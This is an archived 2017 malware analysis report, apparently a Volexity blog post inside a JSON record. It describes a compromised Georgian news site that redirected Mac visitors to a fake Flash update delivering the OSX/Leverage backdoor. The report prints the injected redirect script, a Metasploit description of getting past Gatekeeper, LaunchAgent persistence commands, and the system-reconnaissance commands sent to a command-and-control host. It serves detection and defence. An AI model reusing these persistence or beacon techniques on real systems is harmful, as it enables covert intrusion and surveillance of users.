{
    "id": "d256214e-8231-4909-91e7-e2dfbe7f31f4",
    "created_at": "2023-01-12T15:05:42.921682Z",
    "updated_at": "2025-03-27T02:05:46.94482Z",
    "deleted_at": null,
    "sha1_hash": "4d2cedce15b27178c9e189dd535328c23f5b171d",
    "title": "2017-07-24 - Real News, Fake Flash- Mac OS X Users Targeted",
    "authors": "",
    "file_creation_date": "2022-05-29T01:17:52Z",
    "file_modification_date": "2022-05-29T01:17:52Z",
    "file_size": 639965,
    "plain_text": "# Real News, Fake Flash: Mac OS X Users Targeted\n\n**[volexity.com/blog/2017/07/24/real-news-fake-flash-mac-os-x-users-targeted/](https://www.volexity.com/blog/2017/07/24/real-news-fake-flash-mac-os-x-users-targeted/)**\n\nJuly 24, 2017\n\nby Volexity\n\nVolexity recently identified a breach to the website of a well regarded media outlet in the country of Georgia. As\npart of this breach, the media organization's website was being leveraged as a component of a malware\ncampaign targeting select visitors. The news organization provides reporting on its website in English, Georgian,\nand Russian. However, only the Georgian language portion of the website was impacted and used in an effort to\n\n\n-----\n\ndistribute malware. The targets were then further narrowed to those that were running the Mac OS X operating\nsystem, had not previously visited the website, and had specific browser versions. The attackers accomplished\nmuch of this with JavaScript they placed on the media organization's website.\n\nThe following JavaScript code was observed on the index page of the Georgian language portion of the website.\n\nThe attackers appear to have implemented multiple checks to make sure they limited the targeting and frequency\nof the attacks against visitors to the website. In particular, the JavaScript specifically checks if the vistor's UserAgent is associated with a Mac and that the browser is not Google Chrome. If these conditions pass, cookies for\nthe website are pulled into a variable and inspected. In particular a cookie named site is examined to see if it\nholds the value RNDsstr2Template2 or RNDsstrTemplate. If either cookie is present, it indicates that the visitor\nhas previously visited the website and evaluated the attacker's JavaScript code. If this is the case, the\nexploitation chain will end. The code will then extend the expiration of the site cookie with RNDsstr2Template2\nas its value. However, if initial criteria passed and the site cookie is not present or at least does not contain the\nvalue RNDsstr2Template2 or RNDsstrTemplate, the JavaScript will then create the site cookie with the value\n**RNDsstrTemplate and then call the function prepareFrame().**\n\nThe prepareFrame() function effectively loads an iframe from the following attacker controlled URL:\n\nhttp://updatesec.webredirect[.]org/flash/index.php\n\nDuring most of Volexity's test cases, this page will only return 2 bytes back to the request. However, when\nrequesting the URL with a User-Agent indicative of a Mac system using Safari, Volexity was able to intermittently\nget the the website to return follow on JavaScript. Despite the initial check ensuring the visitor is on a Mac and\nnot running Google Chrome, it appears server-side code performs further checks before attempting to actually\ntarget the user. Volexity observed the following code being returned from the server upon meeting all targeting\nconditions:\n\n<script type='text/javascript'>\n\nwindow.parent.location.href= 'http://updatesec.webredirect[.]org/flashplayer/index.html';\n\n</script>\n\nThis script results in the user being brought to a page titled \"Flash Player Critical Update\" that was designed to\nappear as though it was a legitimate Adobe website. This page in turn loaded an iframe from the following URL:\n\n\n-----\n\nhttp://updatesec.webredirect[.]org/flash.html\n\nThe code from this URL appears to have been generated from Metasploit with a module for the Safari User[Assisted Download and Run Attack. The Metasploit website describes the attack and the module as follows:](https://portal.volexity.com/external-link.jspa?url=https%3A%2F%2Fwww.rapid7.com%2Fdb%2Fmodules%2Fexploit%2Fosx%2Fbrowser%2Fsafari_user_assisted_download_launch)\n\nThis module abuses some Safari functionality to force the download of a zipped .app OSX application\ncontaining our payload. The app is then invoked using a custom URL scheme. At this point, the user is\npresented with Gatekeeper's prompt: \"APP_NAME\" is an application downloaded from the internet. Are you\nsure you want to open it? If the user clicks \"Open\", the app and its payload are executed. If the user has the\n\"Only allow applications downloaded from Mac App Store and identified developers (on by default on OS\n10.8+), the user will see an error dialog containing \"can't be opened because it is from an unidentified\ndeveloper.\" To work around this issue, you will need to manually build and sign an OSX app containing your\npayload with a custom URL handler called \"openurl\". You can put newlines and unicode in your\nAPP_NAME, although you must be careful not to create a prompt that is too tall, or the user will not be able\nto click the buttons, and will have to either logout or kill the CoreServicesUIAgent process.\n\nThe code in this case would attempt to download and install malware from the following URL:\n\nhttp://updatesec.webredirect[.]org/GetFlashPlayer.zip\n\nThe User-Assisted Download and Run would then result in the creation of the file (directory) GetFlashPlayer.app\nand its attempted launch from the user's Downloads directory. Per the description above, OS X will then prompt\nthe user if they are sure they wish to run the file since it was downloaded from the Internet.\n\nIf the user selects \"Open\" or otherwise later launches it from their Download folder, the malware will be launched\nand install a copy of itself at the following path:\n\n**/Users/<username>/Library/Safari/GetFlashPlayer.app/**\n\n\n-----\n\nThe folder structure of the malware and its files is shown below.\n\nThe malware maintains persistence through a Launch Agent by executing the following commands:\n\n**mkdir ~/Library/LaunchAgents**\n\n**echo '<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST**\n**1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"><plist version=\"1.0\"><dict>**\n**<key>RunAtLoad</key><true/><key>KeepAlive</key><true/><key>Label</key>**\n**<string>com.GetFlashPlayer</string><key>ProgramArguments</key><array>**\n**<string>/Users/<username>/Library/Safari/GetFlashPlayer.app/Contents/MacOS/GetFlashPlayer</string>**\n**</array></dict></plist>' > ~/Library/LaunchAgents/com.GetFlashPlayer.plist**\n\nAs can be seen, the malware is writing a plist file named com.GetFlashPlayer.plist into the victim user's\nLaunchAgent directory.\n\nThe RunAtLoad and KeepAlive keys ensure that the malware will gain persistence and keep running.\n\nUpon execution, the malware will also use the open command to launch the URL\nhttps://get.adobe.com/flashplayer/ in a browser window. This new browser activity is meant to trick the user into\nthinking the Adobe Flash Update application is legitimate. The malware then immediately begins to beacon to\n**downloadarchives.servehttp[.]com (213.200.14.138) on TCP port 7777. If a successful connection is made,**\nthe output from the following commands is sent:\n\n1. logname\n2. ioreg -l | grep \"product-name\" | awk -F'\\' '{print $4}'\n3. sw_vers | awk -F':\\t' '{print $2}' | paste -d ' ' - - -;\n4. sysctl -n hw.memsize | awk '{print $0/1073741824\" GB RAM\"}';\n5. df -hl | grep 'disk0s2' | awk '{print $4\"/\"$2\" free (\"$5\" used)\"}'\n6. ioreg -l | grep \"IOPlatformSerialNumber\" | awk -F'' '{print $4}'\n\nThe information gathered by these commands includes the following:\n\n**Command** **Information Gathered**\n\n1 The account name of the logged in user\n\n2 The name and version of the hardware (or virtual machine) running the malware. For example,\n“MacBookAir6,2” or “VmWare9,1”.\n\n3 The installed version of OS X\n\n\n-----\n\n4 The amount, in gigabytes, of RAM installed\n\n5 The amount of disk spaced available and used\n\n6 The system’s serial number (unique to the hardware or virtual machine)\n\nThe backdoor is very noisy and will attempt to communicate with the command and control server every second\nuntil a connection is established.\n\n## Malware File Information\n\nThe malware used by the attackers appears to be a newer version of what has previously been dubbed\n[OSX/Leverage.A and described in public blogs by Intego and](https://portal.volexity.com/external-link.jspa?url=https%3A%2F%2Fwww.intego.com%2Fmac-security-blog%2Ftopic%2Fosxleverage-a%2F) [AlienVault. It is written in Real Basic and beacons](https://portal.volexity.com/external-link.jspa?url=https%3A%2F%2Fwww.alienvault.com%2Fblogs%2Flabs-research%2Fosx-leveragea-analysis)\nback to the attackers once per second until a connection is established. Unlike the earlier version of the malware,\nthis new version does not limit itself to a predefined set of commands and instead allows an unrestricted\ncommand shell capability back into an infected system. Details of the core malware files are provided below.\n\n### File Hashes\n\n**Filename: GetFlashPlayer.zip**\n\n**File size: 1378073 bytes**\n\n**MD5 hash: 6597ffd7d1d241b1bf776bc7e1e3f840**\n\n**SHA1 hash: 2810d554b2e9e14551cef7293e5240b058fb78c3**\n\n**Notes: ZIP file containing the OSX/Leverage.A GetFlashPlayer.app application/directory.**\n\n**Filename: GetFlashPlayer**\n\n**File size: 2131776 bytes**\n\n**MD5 hash: 28064805242b3aa9c138061d6c18e7f5**\n\n**SHA1 hash: 2441e2e9f68b4110218e1fcdc2cfce864b96e2da**\n\n**Notes: Signed OSX/Leverage.A binary masquerading as a legitimate file from Adobe**\n\n### Digitally Signed\n\nThis instance of the OSX/Leverage backdoor had been signed with a code signing certificate that was issued to\nan Apple Developer. Additional notes of interest related to the compilation time of the malware and developer\nname associated with the codesigning certificate are shown below from the codesign utility:\n\n\n-----\n\n$ codesign dvv GetFlashPlayer.app/\n\nExecutable=/Users/volexity/malware/GetFlashPlayer.app/Contents/MacOS/GetFlashPlayer\n\nIdentifier=com.papandopulo.alex\n\nFormat=app bundle with Mach-O thin (i386)\n\nCodeDirectory v=20200 size=10464 flags=0x0(none) hashes=516+3 location=embedded\n\nSignature size=8532\n\nAuthority=Developer ID Application: aleks papandopulo (SN6EU36WE9)\n\nAuthority=Developer ID Certification Authority\n\nAuthority=Apple Root CA\n\nTimestamp=Feb 5, 2016, 06:25:25\n\nInfo.plist entries=16\n\nTeamIdentifier=SN6EU36WE9\n\nSealed Resources version=2 rules=12 files=4\n\nInternal requirements count=1 size=180\n\n## Detection\n\nDetection of the malware can be achieved both from the host and network level. On the host, systems can be\nexamined for the presence of the GetFlashPlayer application and/or Launch Agency under a user's profile.\nAdditionally, any files found to be signed with the certificate described above should be considered to be\nmalicious. At the network level, connections destined for TCP port 7777 should be scrutinized and examined, as\nthis is a non-standard port for typical external communication. The following Emerging Threats rule, found under\ntrojan.rules, will also detect the network beacons:\n\n2017525 - ET TROJAN OSX/Leverage.A Checkin\n\n## Network Indicators\n\n**DNS Names**\n\n**Hostname** **IP Address**\n\nupdatesec.webredirect[.]org 45.77.53.146\n\ndownloadarchives.servehttp[.]com 213.200.14.138\n\n**IP Addresses**\n\nVolexity was also able to find ties between the updatesec.webredirect[.]org exploitation and malware delivery\nserver and the IP address 176.9.192.223. Volexity believes this IP is likely used for similar purposes and is\ndirectly related with the threat activity described in this blog.\n\n**IP Address** **ASN Information**\n\n\n-----\n\n45.77.53.146 20473 | 45.77.52.0/22 | AS-CHOOPA | US | Choopa, LLC, US\n\n213.200.14.138 16010 | 213.200.0.0/19 | MAGTICOMAS, | GE | GE\n\n176.9.192.223 24940 | 176.9.0.0/16 | HETZNER | DE | AS, DE\n\n## [Un]Related Activity\n\nIn a final interesting twist, while writing this blog, Volexity noted that the IP address for the hostname\n**updatesec.webredirect[.]org was updated to resolve to the Lithuanian IP address 185.28.22.22. This IP**\naddress does not appear to be responding on port 80, so no content would be served to visitors. However, it\n[should be noted that this IP address is listed as a command and control server in the Stantinko report that was](https://www.welivesecurity.com/2017/07/20/stantinko-massive-adware-campaign-operating-covertly-since-2012/)\njust released by ESET last week. Volexity is not aware of any ties between this threat activity and those behind\nStantinko.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-07-24 - Real News, Fake Flash- Mac OS X Users Targeted.pdf"
    ],
    "report_names": [
        "2017-07-24 - Real News, Fake Flash- Mac OS X Users Targeted.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535942,
    "ts_updated_at": 1743041146,
    "ts_creation_date": 1653787072,
    "ts_modification_date": 1653787072,
    "files": {
        "pdf": "https://archive.orkl.eu/4d2cedce15b27178c9e189dd535328c23f5b171d.pdf",
        "text": "https://archive.orkl.eu/4d2cedce15b27178c9e189dd535328c23f5b171d.txt",
        "img": "https://archive.orkl.eu/4d2cedce15b27178c9e189dd535328c23f5b171d.jpg"
    }
}